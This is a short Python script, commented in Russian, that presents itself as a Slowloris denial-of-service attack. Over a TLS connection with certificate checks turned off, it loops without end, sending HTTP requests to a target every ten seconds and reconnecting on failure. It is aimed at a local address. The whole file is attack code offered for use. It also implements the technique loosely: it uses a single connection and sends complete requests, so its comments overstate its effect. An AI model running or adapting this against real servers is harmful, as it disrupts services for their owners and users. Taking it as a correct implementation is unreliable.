# -*- coding: windows-1251 -*-
import socket
import time
import ssl

def slowloris(target_ip, target_port):
    request = (
        "GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        "Connection: keep-alive\r\n"
        "User-Agent: Slowloris\r\n"
        "Accept: text/html\r\n\r\n"
    )

    while True:  # Бесконечный цикл атаки
        try:
            print(f"[+] Подключение к {target_ip}:{target_port}")

            # Создаем сокет
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(5)  # Устанавливаем таймаут на подключение

            try:
                client.connect((target_ip, target_port))
            except (socket.timeout, ConnectionRefusedError) as e:
                print(f"[!] Сервер отверг подключение: {e}")
                time.sleep(10)  # Увеличиваем задержку перед повторной попыткой
                continue

            # Создаем SSL-контекст
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            # Оборачиваем сокет в SSL
            client = context.wrap_socket(client, server_hostname=target_ip)

            print("[+] Соединение установлено, начинаем отправку данных...")

            while True:
                try:
                    client.send(request.encode('utf-8'))
                    print("[>] Пакет отправлен")
                    time.sleep(10)  # Медленная атака

                except (ssl.SSLError, socket.error) as e:
                    print(f"[!] Ошибка при отправке данных: {e}")
                    break  # Прерываем текущую сессию и начинаем заново

        except Exception as e:
            print(f"[!] Общая ошибка: {e}")

        finally:
            print("[*] Закрытие соединения, попытка переподключения...")
            try:
                client.close()
            except:
                pass
            time.sleep(5)  # Пауза перед новым подключением

# Запускаем Slowloris
slowloris("127.0.0.1", 8080)
